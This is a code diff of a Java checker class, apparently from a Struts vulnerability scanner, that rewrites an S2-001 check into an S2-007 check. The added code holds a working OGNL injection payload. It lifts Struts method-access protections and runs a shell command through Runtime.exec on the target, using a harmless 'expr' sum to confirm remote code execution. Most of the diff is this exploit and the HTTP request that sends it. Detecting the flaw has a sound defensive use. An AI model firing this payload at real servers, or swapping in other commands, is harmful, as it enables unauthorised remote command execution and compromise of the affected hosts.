@@ -10,12 +10,10 @@ import java.util.Random;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class S2_001 implements Check {
-        public String check_poc = "%%{%s+%s}";
-
+public class S2_007 implements Check {
     public String printInfo(){
-        String info = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password";
-        return  info+"\n";
+        String info = "[+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:user,email,age";
+        return info+"\n";
     }
 
     @Override
@@ -25,29 +23,34 @@ public class S2_001 implements Check {
 
 
     @Override
-    public boolean check(String protocol, String host, int port,String path) throws Exception {
+    public boolean check(String protocol, String host, int port,String path) throws Exception{
 
         Map<String,String> data = new HashMap<String,String>();
 
-
         int number1 = new Random(10000).nextInt(10000);
         int number2 = new Random(10000).nextInt(10000);
-        String poc = String.format(check_poc, number1, number2);
-        data.put("username","test");
-        data.put("password",poc);
-        if(path == null){
-            path = "/login.action";
-        }else if(!path.endsWith(".action")){
-            path = path+"login.action";
-        }
-        String url = protocol+"://"+host+":"+port+path;
+        String poc = "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('expr "+number1+" + "+number2+"').getInputStream())) + '";
+
+        data.put("name","test");
+        data.put("email","test@test.com");
+        data.put("age",poc);
+
         int numsum = number1+number2;
 
 
+        if (path==null){
+            path = "/index.action";
+        }else if(!path.endsWith(".action")){
+            path = path+"index.action";
+        }
+
+        String url = protocol+"://"+host+":"+port+path;
+
         try {
-            HttpResult result = HttpClient.post(url,data);
+            HttpResult result= HttpClient.post(url,data);;
             Pattern p = Pattern.compile(String.valueOf(numsum));
             Matcher m =p.matcher(result.getData());
+
             if(m.find()){
                 return true;
             }else{
@@ -60,7 +63,8 @@ public class S2_001 implements Check {
 
 
 
-    }
+        }
+
 
 
 }
